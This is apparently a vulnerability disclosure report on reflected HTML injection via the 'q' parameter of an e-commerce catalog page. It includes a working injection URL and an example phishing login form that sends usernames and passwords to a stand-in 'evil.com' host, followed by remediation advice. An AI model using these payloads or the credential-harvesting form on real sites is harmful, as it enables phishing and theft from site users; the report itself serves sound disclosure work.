## Title
HTML Injection via `q` Parameter - E-commerce Catalog Portal
## Vulnerability Type
HTML Injection (Client-Side)

## Summary
The catalog page at `https://kzlabs.in/subdomains/catalog/index.php` reflects the `q` query parameter directly into the page's HTML response without sanitization or output encoding. This allows an attacker to inject arbitrary HTML elements - including styled headings, forms, links, and images - into the page as rendered in the victim's browser. Unlike XSS, this does not require JavaScript execution; the injected HTML alone is sufficient to perform phishing, page defacement, and social engineering attacks.

## Vulnerable Endpoint
`https://kzlabs.in/subdomains/catalog/index.php?q=`

## Steps to Reproduce
1. Navigate to the following URL:
   `https://kzlabs.in/subdomains/catalog/index.php?q=%3Ch1+style%3D%22color%3Ared%22%3EHACKED%3C%2Fh1%3E`
2. Observe that a large red **HACKED** heading appears injected into the page - confirming arbitrary HTML renders in the victim's browser from the `q` parameter.

## Payload Used
```
<h1 style="color:red">HACKED</h1>
```
URL encoded: `%3Ch1+style%3D%22color%3Ared%22%3EHACKED%3C%2Fh1%3E`

## Impact
An attacker can leverage this vulnerability to:

- **Page defacement** - inject misleading content, fake error messages, or offensive text that appears to come from the legitimate site.
- **Phishing via fake login forms** - inject a fake credential form that submits to an attacker-controlled server while appearing on the legitimate domain:
  ```
  <form action="https://evil.com/steal">
    <input name="user" placeholder="Email">
    <input name="pass" type="password" placeholder="Password">
    <button>Login</button>
  </form>
  ```
- **Fake discount / offer banners** - on an e-commerce platform specifically, an attacker can inject convincing fake promotional content (e.g. "FLASH SALE - Enter card details to claim") to trick users into submitting sensitive information.
- **Credential harvesting** - a crafted URL shared via email or social media appears to be a legitimate product search link but renders a fake login/payment overlay in the browser.
- **Social engineering** - since the injected content appears on the real domain (`kzlabs.in`), victims are far more likely to trust it compared to a standalone phishing page.

## Recommendations for Fix
1. Apply context-aware output encoding on the `q` parameter (e.g. `htmlspecialchars($q, ENT_QUOTES, 'UTF-8')` in PHP) before reflecting it into the page - this converts `<`, `>`, and `"` into harmless HTML entities, preventing tag injection entirely.
2. Implement a Content-Security-Policy header as defense-in-depth to limit what injected content can do even if encoding is missed.
3. Validate the `q` parameter server-side - for a product search, the value should only contain alphanumeric characters, spaces, and common punctuation; reject anything containing `<` or `>` outright.
